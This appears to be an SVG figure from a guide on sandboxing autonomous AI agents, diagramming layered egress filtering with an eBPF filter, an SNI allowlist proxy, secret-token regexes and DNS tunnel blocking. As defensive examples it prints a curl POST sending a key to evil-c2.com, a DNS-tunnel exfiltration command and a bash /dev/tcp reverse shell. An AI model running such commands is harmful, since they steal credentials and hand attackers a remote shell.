<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 960 540" width="100%" height="100%">
  <defs>
    <filter id="shadow" x="-3%" y="-3%" width="106%" height="108%" filterUnits="userSpaceOnUse">
      <feDropShadow dx="1" dy="2" stdDeviation="3" flood-color="#0f172a" flood-opacity="0.08" />
    </filter>
    <marker id="arrow-blue" viewBox="0 0 10 10" refX="6" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
      <path d="M 0 1 L 8 5 L 0 9 z" fill="#0284C7" />
    </marker>
    <marker id="arrow-red" viewBox="0 0 10 10" refX="6" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
      <path d="M 0 1 L 8 5 L 0 9 z" fill="#DC2626" />
    </marker>
    <marker id="arrow-green" viewBox="0 0 10 10" refX="6" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
      <path d="M 0 1 L 8 5 L 0 9 z" fill="#16A34A" />
    </marker>
  </defs>

  <!-- Background Canvas -->
  <rect width="960" height="540" fill="#FFFFFF" rx="12" />
  <rect x="8" y="8" width="944" height="524" fill="#FAFAFC" rx="10" stroke="#E2E8F0" stroke-width="1" />

  <!-- Figure Badge & Title -->
  <g transform="translate(24, 20)">
    <rect x="0" y="0" width="88" height="20" rx="4" fill="#0F766E" />
    <text x="44" y="14" font-family="system-ui, -apple-system, sans-serif" font-size="10" font-weight="700" fill="#FFFFFF" text-anchor="middle" letter-spacing="0.5">FIGURE 11.4</text>
    <text x="100" y="15" font-family="system-ui, -apple-system, sans-serif" font-size="15" font-weight="700" fill="#0F172A">Multi-Layer Network Egress Filtering and Data Exfiltration Prevention</text>
    <text x="100" y="31" font-family="system-ui, -apple-system, sans-serif" font-size="11" fill="#64748B">Transparent eBPF packet redirection, SNI domain allowlists, DNS tunnel mitigation, and outbound token regex redaction</text>
  </g>

  <!-- STEP 1: Sandbox & Attack Vectors (Left) -->
  <g transform="translate(24, 66)">
    <rect width="210" height="390" rx="8" fill="#FFFFFF" stroke="#FCA5A5" stroke-width="1.2" filter="url(#shadow)" />
    <rect width="210" height="32" rx="8" fill="#FEF2F2" />
    <text x="12" y="21" font-family="system-ui, -apple-system, sans-serif" font-size="11" font-weight="700" fill="#991B1B">Untrusted Sandbox Code</text>

    <!-- Legitimate Request -->
    <g transform="translate(10, 42)">
      <rect width="190" height="66" rx="6" fill="#F0FDF4" stroke="#86EFAC" stroke-width="0.8" />
      <text x="10" y="16" font-family="system-ui, -apple-system, sans-serif" font-size="9" font-weight="700" fill="#166534">Legitimate Dependency Fetch</text>
      <rect x="10" y="24" width="170" height="32" rx="4" fill="#FFFFFF" stroke="#DCFCE7" stroke-width="0.8" />
      <text x="16" y="38" font-family="monospace" font-size="7.5" fill="#15803D">pip install pytest requests</text>
      <text x="16" y="49" font-family="monospace" font-size="7.5" fill="#475569">Target: https://pypi.org</text>
    </g>

    <!-- Exfiltration Threat 1: Direct HTTP POST -->
    <g transform="translate(10, 118)">
      <rect width="190" height="84" rx="6" fill="#FEF2F2" stroke="#F87171" stroke-width="0.8" />
      <text x="10" y="16" font-family="system-ui, -apple-system, sans-serif" font-size="9" font-weight="700" fill="#991B1B">Threat 1: HTTP Secret Exfiltration</text>
      <text x="10" y="29" font-family="system-ui, -apple-system, sans-serif" font-size="8" fill="#7F1D1D">Adversary injects cURL command</text>
      <rect x="10" y="35" width="170" height="42" rx="4" fill="#FFFFFF" stroke="#FECACA" stroke-width="0.8" />
      <text x="16" y="47" font-family="monospace" font-size="7" fill="#DC2626">curl -X POST https://evil-c2.com</text>
      <text x="16" y="58" font-family="monospace" font-size="7" fill="#DC2626">  -d "k=AKIAIOSFODNN7EXAMPLE"</text>
      <text x="16" y="70" font-family="monospace" font-size="7" fill="#7F1D1D">  --header "Content-Type: text"</text>
    </g>

    <!-- Exfiltration Threat 2: DNS Tunneling -->
    <g transform="translate(10, 212)">
      <rect width="190" height="84" rx="6" fill="#FEF2F2" stroke="#F87171" stroke-width="0.8" />
      <text x="10" y="16" font-family="system-ui, -apple-system, sans-serif" font-size="9" font-weight="700" fill="#991B1B">Threat 2: DNS Covert Tunneling</text>
      <text x="10" y="29" font-family="system-ui, -apple-system, sans-serif" font-size="8" fill="#7F1D1D">Encodes tokens into DNS queries</text>
      <rect x="10" y="35" width="170" height="42" rx="4" fill="#FFFFFF" stroke="#FECACA" stroke-width="0.8" />
      <text x="16" y="47" font-family="monospace" font-size="7" fill="#DC2626">token=$(cat /etc/api_key)</text>
      <text x="16" y="58" font-family="monospace" font-size="7" fill="#DC2626">dig $token.evil-tunnel.org</text>
      <text x="16" y="70" font-family="monospace" font-size="7" fill="#7F1D1D">Bypasses standard TCP firewalls!</text>
    </g>

    <!-- Threat 3: Direct Raw IP Connection -->
    <g transform="translate(10, 306)">
      <rect width="190" height="74" rx="6" fill="#FEF2F2" stroke="#F87171" stroke-width="0.8" />
      <text x="10" y="16" font-family="system-ui, -apple-system, sans-serif" font-size="9" font-weight="700" fill="#991B1B">Threat 3: Direct Reverse Shell</text>
      <rect x="10" y="24" width="170" height="34" rx="4" fill="#FFFFFF" stroke="#FECACA" stroke-width="0.8" />
      <text x="16" y="37" font-family="monospace" font-size="7" fill="#DC2626">bash -i &gt;&amp; /dev/tcp/198.51.100.1</text>
      <text x="16" y="48" font-family="monospace" font-size="7" fill="#DC2626">  /4444 0&gt;&amp;1 (Raw TCP IP socket)</text>
      <text x="10" y="68" font-family="system-ui, -apple-system, sans-serif" font-size="7.5" fill="#7F1D1D">Reverse shell directly to hacker server</text>
    </g>
  </g>

  <!-- STEP 2: Layer 1 - Kernel / eBPF Packet Filtering -->
  <g transform="translate(244, 66)">
    <rect width="190" height="390" rx="8" fill="#FFFFFF" stroke="#CBD5E1" stroke-width="1" filter="url(#shadow)" />
    <rect width="190" height="32" rx="8" fill="#F8FAFC" />
    <text x="12" y="21" font-family="system-ui, -apple-system, sans-serif" font-size="10.5" font-weight="700" fill="#1E293B">Layer 1: Kernel eBPF Filter</text>

    <g transform="translate(10, 42)">
      <rect width="170" height="96" rx="6" fill="#EFF6FF" stroke="#BFDBFE" stroke-width="0.8" />
      <text x="8" y="15" font-family="system-ui, -apple-system, sans-serif" font-size="9" font-weight="700" fill="#1E40AF">1. Namespace Routing</text>
      <text x="8" y="28" font-family="system-ui, -apple-system, sans-serif" font-size="7.5" fill="#334155">• Isolated Net Namespace</text>
      <text x="8" y="40" font-family="system-ui, -apple-system, sans-serif" font-size="7.5" fill="#334155">• No default host gateway route</text>
      <text x="8" y="52" font-family="system-ui, -apple-system, sans-serif" font-size="7.5" fill="#334155">• All traffic steered to virtual</text>
      <text x="8" y="64" font-family="monospace" font-size="7.5" fill="#0284C7">  veth0 / tap0 interface</text>
      <rect x="8" y="72" width="154" height="18" rx="3" fill="#DBEAFE" />
      <text x="85" y="84" font-family="system-ui, -apple-system, sans-serif" font-size="7.5" font-weight="700" fill="#1E40AF" text-anchor="middle">Traffic Bound to Proxy</text>
    </g>

    <g transform="translate(10, 148)">
      <rect width="170" height="106" rx="6" fill="#F8FAFC" stroke="#CBD5E1" stroke-width="0.8" />
      <text x="8" y="15" font-family="system-ui, -apple-system, sans-serif" font-size="9" font-weight="700" fill="#1E293B">2. Raw IP Packet Drop</text>
      <text x="8" y="28" font-family="system-ui, -apple-system, sans-serif" font-size="7.5" fill="#475569">• eBPF TC filter attached</text>
      <text x="8" y="40" font-family="system-ui, -apple-system, sans-serif" font-size="7.5" fill="#475569">• Checks destination IP format</text>
      <text x="8" y="52" font-family="system-ui, -apple-system, sans-serif" font-size="7.5" fill="#DC2626">• Direct numeric IPs blocked:</text>
      <text x="8" y="64" font-family="monospace" font-size="7.5" fill="#B91C1C">  198.51.100.1 → TC_ACT_SHOT</text>
      <rect x="8" y="74" width="154" height="24" rx="3" fill="#FEE2E2" />
      <text x="85" y="86" font-family="system-ui, -apple-system, sans-serif" font-size="7.5" font-weight="700" fill="#991B1B" text-anchor="middle">Reverse Shell Defeated</text>
      <text x="85" y="95" font-family="system-ui, -apple-system, sans-serif" font-size="7" fill="#7F1D1D" text-anchor="middle">Zero direct socket egress</text>
    </g>

    <g transform="translate(10, 264)">
      <rect width="170" height="116" rx="6" fill="#F8FAFC" stroke="#CBD5E1" stroke-width="0.8" />
      <text x="8" y="15" font-family="system-ui, -apple-system, sans-serif" font-size="9" font-weight="700" fill="#1E293B">3. Port Enforcement</text>
      <text x="8" y="28" font-family="system-ui, -apple-system, sans-serif" font-size="7.5" fill="#475569">• Allowed Ports: 443 (HTTPS),</text>
      <text x="8" y="40" font-family="system-ui, -apple-system, sans-serif" font-size="7.5" fill="#475569">  53 (DNS via proxy only)</text>
      <text x="8" y="52" font-family="system-ui, -apple-system, sans-serif" font-size="7.5" fill="#475569">• Blocked: 22 (SSH), 25 (SMTP),</text>
      <text x="8" y="64" font-family="system-ui, -apple-system, sans-serif" font-size="7.5" fill="#475569">  3389 (RDP), 6667 (IRC), 8080</text>
      <rect x="8" y="74" width="154" height="34" rx="3" fill="#FEF3C7" stroke="#FDE68A" stroke-width="0.8" />
      <text x="8" y="87" font-family="system-ui, -apple-system, sans-serif" font-size="7.5" font-weight="700" fill="#92400E">C2 Mining Pool Defense</text>
      <text x="8" y="99" font-family="system-ui, -apple-system, sans-serif" font-size="7" fill="#78350F">No arbitrary outbound ports</text>
    </g>
  </g>

  <!-- STEP 3: Layer 2 - Transparent Egress Proxy (Middle) -->
  <g transform="translate(444, 66)">
    <rect width="250" height="390" rx="8" fill="#FFFFFF" stroke="#0F766E" stroke-width="1.5" filter="url(#shadow)" />
    <rect width="250" height="32" rx="8" fill="#F0FDFA" />
    <text x="12" y="21" font-family="system-ui, -apple-system, sans-serif" font-size="10.5" font-weight="700" fill="#0F766E">Layer 2: Transparent Proxy (Envoy)</text>

    <!-- Subcomponent A: TLS SNI Whitelisting -->
    <g transform="translate(10, 42)">
      <rect width="230" height="110" rx="6" fill="#F8FAFC" stroke="#CBD5E1" stroke-width="0.8" />
      <text x="10" y="16" font-family="system-ui, -apple-system, sans-serif" font-size="9" font-weight="700" fill="#1E293B">A. SNI &amp; Host Domain Whitelisting</text>
      <text x="10" y="28" font-family="system-ui, -apple-system, sans-serif" font-size="7.5" fill="#475569">Extracts SNI before TLS handshake:</text>

      <rect x="10" y="34" width="210" height="32" rx="4" fill="#F0FDF4" stroke="#86EFAC" stroke-width="0.8" />
      <text x="16" y="47" font-family="monospace" font-size="7.5" fill="#15803D">MATCH: *.pypi.org, *.github.com</text>
      <text x="16" y="58" font-family="system-ui, -apple-system, sans-serif" font-size="7" font-weight="600" fill="#166534">ACTION: Pass Through Allowed</text>

      <rect x="10" y="70" width="210" height="34" rx="4" fill="#FEF2F2" stroke="#FCA5A5" stroke-width="0.8" />
      <text x="16" y="83" font-family="monospace" font-size="7.5" fill="#B91C1C">MATCH: evil-c2.com (Unlisted)</text>
      <text x="16" y="95" font-family="system-ui, -apple-system, sans-serif" font-size="7" font-weight="700" fill="#DC2626">ACTION: 403 Forbidden + Kill Sandbox</text>
    </g>

    <!-- Subcomponent B: Payload Regex & Secret Redaction -->
    <g transform="translate(10, 160)">
      <rect width="230" height="114" rx="6" fill="#F8FAFC" stroke="#CBD5E1" stroke-width="0.8" />
      <text x="10" y="16" font-family="system-ui, -apple-system, sans-serif" font-size="9" font-weight="700" fill="#1E293B">B. Outbound Secret &amp; Token Scanner</text>
      <text x="10" y="28" font-family="system-ui, -apple-system, sans-serif" font-size="7.5" fill="#475569">Deep packet inspection on body payloads:</text>

      <rect x="10" y="34" width="210" height="42" rx="4" fill="#FFFBEB" stroke="#FDE68A" stroke-width="0.8" />
      <text x="16" y="46" font-family="monospace" font-size="7" fill="#B45309">AWS Key:  AKIA[0-9A-Z]{16}</text>
      <text x="16" y="57" font-family="monospace" font-size="7" fill="#B45309">GitHub:   ghp_[0-9a-zA-Z]{36}</text>
      <text x="16" y="68" font-family="monospace" font-size="7" fill="#B45309">PrivKey:  -----BEGIN RSA PRIVATE...</text>

      <rect x="10" y="80" width="210" height="26" rx="4" fill="#FEF2F2" />
      <text x="115" y="93" font-family="system-ui, -apple-system, sans-serif" font-size="7.5" font-weight="700" fill="#B91C1C" text-anchor="middle">Data Exfiltration Blocked!</text>
      <text x="115" y="102" font-family="system-ui, -apple-system, sans-serif" font-size="6.8" fill="#7F1D1D" text-anchor="middle">Secret dropped before reaching network</text>
    </g>

    <!-- Subcomponent C: DNS Tunnel Mitigation -->
    <g transform="translate(10, 282)">
      <rect width="230" height="98" rx="6" fill="#F8FAFC" stroke="#CBD5E1" stroke-width="0.8" />
      <text x="10" y="16" font-family="system-ui, -apple-system, sans-serif" font-size="9" font-weight="700" fill="#1E293B">C. DNS Tunneling &amp; Sinkhole Guard</text>
      <text x="10" y="28" font-family="system-ui, -apple-system, sans-serif" font-size="7.5" fill="#475569">• Restricts query length: &lt; 50 chars</text>
      <text x="10" y="40" font-family="system-ui, -apple-system, sans-serif" font-size="7.5" fill="#475569">• High-entropy Shannon label filter</text>
      <text x="10" y="52" font-family="system-ui, -apple-system, sans-serif" font-size="7.5" fill="#475569">• DNS requests routed to internal resolver</text>
      <rect x="10" y="60" width="210" height="28" rx="4" fill="#E0F2FE" />
      <text x="115" y="73" font-family="monospace" font-size="7" fill="#0369A1" text-anchor="middle">dig $token.evil.org → NXDOMAIN</text>
      <text x="115" y="83" font-family="system-ui, -apple-system, sans-serif" font-size="7" font-weight="600" fill="#0369A1" text-anchor="middle">Attacker nameserver receives 0 bytes</text>
    </g>
  </g>

  <!-- STEP 4: Destinations (Right) -->
  <g transform="translate(704, 66)">
    <rect width="232" height="390" rx="8" fill="#FFFFFF" stroke="#CBD5E1" stroke-width="1" filter="url(#shadow)" />
    <rect width="232" height="32" rx="8" fill="#F8FAFC" />
    <text x="12" y="21" font-family="system-ui, -apple-system, sans-serif" font-size="11" font-weight="700" fill="#1E293B">Egress Destination Verdict</text>

    <!-- Allowed Destination -->
    <g transform="translate(10, 42)">
      <rect width="212" height="150" rx="6" fill="#F0FDF4" stroke="#86EFAC" stroke-width="1.2" />
      <rect width="212" height="26" rx="6" fill="#DCFCE7" />
      <circle cx="20" cy="13" r="5" fill="#16A34A" />
      <text x="32" y="17" font-family="system-ui, -apple-system, sans-serif" font-size="9.5" font-weight="700" fill="#166534">ALLOWED DESTINATIONS</text>

      <g transform="translate(10, 34)">
        <text x="0" y="14" font-family="monospace" font-size="8" font-weight="600" fill="#166534">pypi.org / files.python...</text>
        <text x="0" y="25" font-family="system-ui, -apple-system, sans-serif" font-size="7.5" fill="#475569">Python package installation</text>

        <text x="0" y="44" font-family="monospace" font-size="8" font-weight="600" fill="#166534">api.github.com</text>
        <text x="0" y="55" font-family="system-ui, -apple-system, sans-serif" font-size="7.5" fill="#475569">Authorized git remote repository</text>

        <text x="0" y="74" font-family="monospace" font-size="8" font-weight="600" fill="#166534">registry.npmjs.org</text>
        <text x="0" y="85" font-family="system-ui, -apple-system, sans-serif" font-size="7.5" fill="#475569">Node package dependencies</text>

        <rect x="0" y="94" width="192" height="18" rx="3" fill="#BBF7D0" />
        <text x="96" y="106" font-family="system-ui, -apple-system, sans-serif" font-size="7.5" font-weight="700" fill="#14532D" text-anchor="middle">HTTP 200 OK • Clean Pipeline</text>
      </g>
    </g>

    <!-- Blocked Destination -->
    <g transform="translate(10, 202)">
      <rect width="212" height="178" rx="6" fill="#FEF2F2" stroke="#F87171" stroke-width="1.2" />
      <rect width="212" height="26" rx="6" fill="#FEE2E2" />
      <circle cx="20" cy="13" r="5" fill="#DC2626" />
      <text x="32" y="17" font-family="system-ui, -apple-system, sans-serif" font-size="9.5" font-weight="700" fill="#991B1B">BLOCKED DESTINATIONS</text>

      <g transform="translate(10, 34)">
        <text x="0" y="14" font-family="monospace" font-size="8" font-weight="600" fill="#B91C1C">evil-c2.com (Malicious Host)</text>
        <text x="0" y="25" font-family="system-ui, -apple-system, sans-serif" font-size="7.5" fill="#7F1D1D">SNI violation → Reset connection</text>

        <text x="0" y="44" font-family="monospace" font-size="8" font-weight="600" fill="#B91C1C">198.51.100.1:4444</text>
        <text x="0" y="55" font-family="system-ui, -apple-system, sans-serif" font-size="7.5" fill="#7F1D1D">Raw IP / Port → eBPF drop</text>

        <text x="0" y="74" font-family="monospace" font-size="8" font-weight="600" fill="#B91C1C">*.evil-tunnel.org</text>
        <text x="0" y="85" font-family="system-ui, -apple-system, sans-serif" font-size="7.5" fill="#7F1D1D">DNS exfil tunnel → Sinkholed</text>

        <rect x="0" y="96" width="192" height="38" rx="3" fill="#FCA5A5" />
        <text x="96" y="110" font-family="system-ui, -apple-system, sans-serif" font-size="8" font-weight="700" fill="#7F1D1D" text-anchor="middle">SECURITY ALERT EMITTED</text>
        <text x="96" y="124" font-family="system-ui, -apple-system, sans-serif" font-size="7.5" fill="#450A0A" text-anchor="middle">Agent Trajectory Killed Immediately</text>
      </g>
    </g>
  </g>

  <!-- Connectors between columns -->
  <line x1="234" y1="80" x2="244" y2="80" stroke="#16A34A" stroke-width="2" marker-end="url(#arrow-green)" />
  <line x1="234" y1="160" x2="244" y2="160" stroke="#DC2626" stroke-width="2" marker-end="url(#arrow-red)" />
  <line x1="434" y1="100" x2="444" y2="100" stroke="#16A34A" stroke-width="2" marker-end="url(#arrow-green)" />
  <line x1="434" y1="200" x2="444" y2="200" stroke="#DC2626" stroke-width="2" marker-end="url(#arrow-red)" />
  <line x1="694" y1="110" x2="704" y2="110" stroke="#16A34A" stroke-width="2" marker-end="url(#arrow-green)" />
  <line x1="694" y1="290" x2="704" y2="290" stroke="#DC2626" stroke-width="2" marker-end="url(#arrow-red)" />

  <!-- Footer Insight Bar -->
  <g transform="translate(24, 468)">
    <rect width="912" height="54" rx="6" fill="#F8FAFC" stroke="#CBD5E1" stroke-width="1" />
    <text x="14" y="19" font-family="system-ui, -apple-system, sans-serif" font-size="10" font-weight="700" fill="#0F172A">Zero Trust Network Invariant for Autonomous Agents:</text>
    <text x="14" y="34" font-family="system-ui, -apple-system, sans-serif" font-size="8.5" fill="#334155">1. Never grant an autonomous agent direct internet access. Untrusted code can exfiltrate sensitive tokens or install command-and-control (C2) payloads.</text>
    <text x="14" y="46" font-family="system-ui, -apple-system, sans-serif" font-size="8.5" fill="#334155">2. Strict egress proxying (SNI whitelist + secret regex redaction + DNS sinkholing) turns unauthorized exfiltration attempts into immediate containment triggers.</text>
  </g>
</svg>
